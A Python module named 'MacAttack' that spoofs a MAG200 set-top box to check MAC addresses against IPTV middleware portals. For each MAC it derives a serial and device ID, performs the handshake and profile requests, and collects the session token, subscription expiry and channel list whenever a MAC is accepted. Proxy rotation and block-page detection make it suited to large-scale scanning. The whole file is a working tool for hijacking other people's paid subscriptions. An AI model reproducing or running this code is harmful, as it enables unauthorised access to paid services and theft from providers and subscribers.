import aiohttp
import asyncio
import hashlib
import logging
import json

logger = logging.getLogger("MacAttack.AsyncSTB")

class ProxyError(Exception): pass
class ProxyBlockedError(ProxyError): pass
class ProxyDeadError(ProxyError): pass

def parse_proxy(proxy_str):
    if not proxy_str: return None
    proxy_str = proxy_str.strip()
    if not proxy_str.startswith(("http://", "https://", "socks5://", "socks4://")):
        return f"http://{proxy_str}"
    return proxy_str

class AsyncStbClient:
    def __init__(self, timeout=10):
        self.timeout = aiohttp.ClientTimeout(total=20, connect=5)
        self.connector = aiohttp.TCPConnector(ssl=False, limit=0)
        self.session = None

    async def init_session(self):
        if not self.session or self.session.closed:
            self.session = aiohttp.ClientSession(
                connector=self.connector, 
                timeout=self.timeout,
                headers={'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3'}
            )

    async def close(self):
        if self.session:
            await self.session.close()

    async def _request(self, url, params, headers, proxy):
        try:
            p_url = parse_proxy(proxy)
            async with self.session.get(url, params=params, headers=headers, proxy=p_url) as resp:
                if resp.status != 200:
                    raise ProxyDeadError(f"HTTP {resp.status}")
                
                ctype = resp.headers.get('Content-Type', '').lower()
                content = await resp.text()
                
                if 'json' not in ctype and not content.strip().startswith('{'):
                    raise ProxyBlockedError("HTML Blockpage detected")
                
                return json.loads(content)
        except Exception as e:
            raise ProxyDeadError(str(e))

    async def quick_scan(self, portal_url, mac, proxy):
        await self.init_session()
        base_url = portal_url.rstrip('/')
        mac = mac.upper()
        sn = hashlib.md5(mac.encode()).hexdigest().upper()[:13]
        dev_id2 = hashlib.sha256(sn.encode()).hexdigest().upper()
        
        headers = {'Cookie': f'mac={mac}; stid={dev_id2}'}
        
        # 1. Handshake
        params = {'type': 'stb', 'action': 'handshake', 'token': '', 'mac': mac, 'stid': dev_id2}
        data = await self._request(f"{base_url}/server/load.php", params, headers, proxy)
        token = data.get('js', {}).get('token')
        
        if not token: return False, None

        # 2. Profile
        headers['Authorization'] = f"Bearer {token}"
        params = {'type': 'stb', 'action': 'get_profile', 'mac': mac, 'stid': dev_id2}
        profile = await self._request(f"{base_url}/server/load.php", params, headers, proxy)
        
        js = profile.get('js', {})
        if not js: return False, None

        return True, {
            'mac': mac, 'portal': portal_url, 'expiry': js.get('phone', 'N/A'),
            'token': token, 'stid': dev_id2, 'base_url': base_url
        }

    async def fetch_details(self, res, proxy):
        headers = {'Cookie': f"mac={res['mac']}; stid={res['stid']}", 'Authorization': f"Bearer {res['token']}"}
        url = f"{res['base_url']}/server/load.php"
        
        # Parallel Genre & Channel Fetch
        tasks = [
            self._request(url, {'type': 'itv', 'action': 'get_genres'}, headers, proxy),
            self._request(url, {'type': 'itv', 'action': 'get_all_channels'}, headers, proxy)
        ]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        res['genres'] = [g['title'] for g in results[0].get('js', [])] if not isinstance(results[0], Exception) else []
        res['channels'] = len(results[1].get('js', {}).get('data', [])) if not isinstance(results[1], Exception) else 0
        return res
